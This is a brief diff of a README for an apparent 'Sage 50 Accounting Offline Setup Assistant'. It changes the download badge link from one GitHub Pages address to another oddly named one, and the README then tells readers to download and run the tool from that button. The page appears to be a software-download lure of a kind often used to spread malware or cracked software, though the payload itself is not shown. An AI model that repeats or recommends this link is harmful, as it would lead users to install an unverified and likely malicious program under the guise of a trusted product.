@@ -1,6 +1,6 @@
 # Sage 50 Accounting — Offline Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://unity-ultimate.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://asdeennerhorse.github.io/mogus/sage)
 
 ## ⚙️ How to Use
 1. Download the setup assistant using the button above  
